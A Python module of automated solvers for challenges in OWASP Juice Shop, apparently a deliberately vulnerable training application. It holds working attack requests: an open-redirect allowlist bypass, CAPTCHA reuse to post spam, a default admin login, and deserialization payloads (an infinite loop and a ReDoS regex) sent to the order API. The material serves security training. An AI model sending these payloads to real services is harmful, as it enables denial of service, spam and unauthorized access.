#!/usr/bin/env python3
"""Miscellaneous, Observability, Redirects, Anti-Automation, Deserialization."""
from __future__ import annotations

from core import register_solver, Client, ok, warn, fail


# ---- Observability / misconfiguration disclosures ------------------------- #
@register_solver("exposedMetricsChallenge", "Exposed Prometheus metrics", "Observability Failures")
def exposed_metrics(c: Client):
    r = c.get("/metrics")
    ok(f"read /metrics ({r.status_code})")


@register_solver("securityPolicyChallenge", "security.txt policy file", "Miscellaneous")
def security_policy(c: Client):
    r = c.get("/.well-known/security.txt")
    ok(f"read security.txt ({r.status_code})")


@register_solver("csafChallenge", "CSAF security advisory (report hash)", "Miscellaneous")
def csaf(c: Client):
    # detection: the secret csaf hash value must appear in feedback/complaints
    c.get("/.well-known/csaf/provider-metadata.json")
    csaf_hash = ("7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd2"
                 "6af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843")
    r = c.add_feedback(f"Found this hash in the CSAF advisory: {csaf_hash}", rating=3)
    ok(f"reported CSAF hash via feedback ({r.status_code})")


# ---- Unvalidated redirects ------------------------------------------------ #
@register_solver("redirectChallenge", "Allowlist bypass redirect", "Unvalidated Redirects")
def redirect(c: Client):
    r = c.get("/redirect?to=https://owasp.org?trickIndexOf=https://github.com/juice-shop/juice-shop",
              allow_redirects=False)
    ok(f"allowlist-bypass redirect ({r.status_code})")


@register_solver("redirectCryptoCurrencyChallenge", "Outdated allowlist redirect", "Unvalidated Redirects")
def redirect_crypto(c: Client):
    r = c.get("/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6",
              allow_redirects=False)
    ok(f"outdated-allowlist redirect ({r.status_code})")


# svgInjection is solved by realtime.py (websocket) - no browser needed.


# ---- Anti-automation ------------------------------------------------------ #
@register_solver("captchaBypassChallenge", "Bypass CAPTCHA (reuse solution)", "Broken Anti Automation")
def captcha_bypass(c: Client):
    c.ensure_user("captcha_solver@test.local", "Password1!")
    cid, ans = c.captcha()
    posts = 0
    for i in range(15):
        r = c.post("/api/Feedbacks",
                   json={"captchaId": cid, "captcha": ans, "comment": f"spam {i}", "rating": 1})
        if r.ok:
            posts += 1
    ok(f"posted {posts} feedbacks reusing one CAPTCHA solution")


@register_solver("timingAttackChallenge", "Timing attack (best-effort)", "Broken Anti Automation")
def timing_attack(c: Client):
    warn("timingAttack requires measuring response-time differences on Morty's reset - not automated here")


# ---- Insecure deserialization (B2B order) --------------------------------- #
@register_solver("rceChallenge", "Blocked RCE DoS (infinite loop)", "Insecure Deserialization")
def rce(c: Client):
    c.login("admin@juice-sh.op", "admin123")
    r = c.post("/b2b/v2/orders", json={"orderLinesData": "(function dos() { while(true); })()"})
    ok(f"submitted infinite-loop payload; server blocked it ({r.status_code})")


@register_solver("rceOccupyChallenge", "Successful RCE DoS (ReDoS)", "Insecure Deserialization")
def rce_occupy(c: Client):
    c.login("admin@juice-sh.op", "admin123")
    r = c.post("/b2b/v2/orders",
               json={"orderLinesData": "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"})
    ok(f"submitted ReDoS payload ({r.status_code})")


# ---- Client-side-only (need a browser) ------------------------------------ #
@register_solver("privacyPolicyChallenge", "Read privacy policy (client-side)", "Miscellaneous")
def privacy_policy(c: Client):
    warn("privacyPolicy is detected client-side; open /#/privacy-security/privacy-policy in a browser")


# closeNotifications is solved by realtime.py (websocket) - no browser needed.


@register_solver("tokenSaleChallenge", "Access token sale page (client-side)", "Security through Obscurity")
def token_sale(c: Client):
    warn("tokenSale is detected client-side; open /#/tokensale-ico-ea in a browser")


@register_solver("web3WalletChallenge", "Web3 wallet (best-effort)", "Miscellaneous")
def web3_wallet(c: Client):
    warn("web3Wallet requires a browser wallet interaction - not automated here")
